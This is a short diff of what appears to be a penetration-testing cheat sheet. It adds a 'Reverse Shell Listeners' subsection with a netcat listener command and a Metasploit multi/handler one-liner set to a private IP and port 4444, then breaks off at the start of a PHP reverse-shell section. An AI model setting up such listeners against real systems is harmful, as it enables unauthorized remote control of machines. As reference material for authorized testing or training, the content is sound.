@@ -125,7 +125,12 @@
 
 <details>
     <summary><H4>Exploitation</H4></summary>
-    
+  
+<h5>Reverse Shell Listeners</h5>
+
+    nc -lvnp 4444
+    msfconsole -q -x "use multi/handler; set LHOST 10.10.17.97; set LPORT 4444; run"
+
 <h5>Reverse Shells</h5>
 
     <?php
